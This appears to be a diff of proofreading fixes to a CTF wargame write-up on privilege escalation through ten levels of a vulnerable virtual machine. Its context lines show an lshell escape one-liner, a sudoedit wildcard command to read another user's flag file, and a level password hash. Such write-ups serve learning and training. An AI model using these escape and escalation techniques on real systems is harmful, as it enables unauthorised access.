@@ -25,7 +25,7 @@ The vulnerable virtual machine can be downloaded [here](https://www.):
 
 Here are the rules:
 * First, we SSH as `level1` into ```/wargames/level1/```
-* Our goal is to elevate our privileges as level1_OK to read the ```validation/flag``` file.
+* Our goal is to elevate our privileges as `level1_OK` to read the ```validation/flag``` file.
 * This flag enables us to SSH as `level2` into ```/wargames/level2```, etc.
 * The main goal is to read `level10`'s ```validation/flag```.
 
@@ -259,7 +259,7 @@ level6_OK:~$ help
 cd     date  exit  history  lpath  lsudo  whereis
 clear  echo  help  id       ls     pwd    whoami 
 ```
-Now we are `level6_OK`, but into a limited shell. We can't do lot of things... The hint in home directory tells us that this is `lshell`. After some reasearches, we found into github issues of the project [a way to escape](https://image.noelshack.com/fichiers/2018/27/3/1530738563-capture-d-ecran-2018-07-04-a-23-08-30.png) lshell.
+Now we are `level6_OK`, but into a limited shell. We can't do lot of things... The hint in home directory tells us that this is `lshell`. After some researches, we found into lshell github issues a way to [escape](https://image.noelshack.com/fichiers/2018/27/3/1530738563-capture-d-ecran-2018-07-04-a-23-08-30.png) lshell.
 ```bash
 level6_OK:~$ echo FREEDOM! && cd () bash && cd
 FREEDOM!
@@ -286,7 +286,7 @@ The double wildcard catches our attention. We look for a privilege escalation ex
 ```bash
 sudoedit -u level7_OK /wargames/level7/ validation/flag /hello.html
 ```
-It modifies out `validation/flag` as `level7_OK` and we can see the flag
+It modifies our `validation/flag` as `level7_OK` and we can see the flag
 ```bash
 GNU nano 2.7.4             File: /var/tmp/flag.XXarylty                       
 
@@ -365,7 +365,7 @@ dr-xr-xr-x 12 root      root      4096 May 28 07:03 ..
 lrwxrwxrwx  1 root      root        26 Jun  4 15:26 mysql -> /usr/local/mysql/bin/mysql
 dr-x------  2 level9_OK level9_OK 4096 May 22 08:36 validation
 ```
-With `ps` command, we see `mysql` is started as `level9_OK`, and we have `basedir`, `datadir` and `plugin-dir`
+With `ps` command, we see `mysqld` is started as `level9_OK`, and we have `basedir`, `datadir` and `plugin-dir`
 ```bash
 level9@harmonie-technologie:~$ ps -aux | grep mysql
 ...
@@ -411,7 +411,7 @@ mdp : 181b70c897ddd4a4673d5794206379b7
 >levelfinal:181b70c897ddd4a4673d5794206379b7
  
 ## Challenge 10
-A `ls` let us know we have a `levelfinal` binary with setuid bit. Again, it means it is executed as `levelfinal_OK`.
+A `ls` lets us know we have a `levelfinal` binary with setuid bit. Again, it means it is executed as `levelfinal_OK`.
 ```bash
 levelfinal@harmonie-technologie:~$ ls -la
 total 32
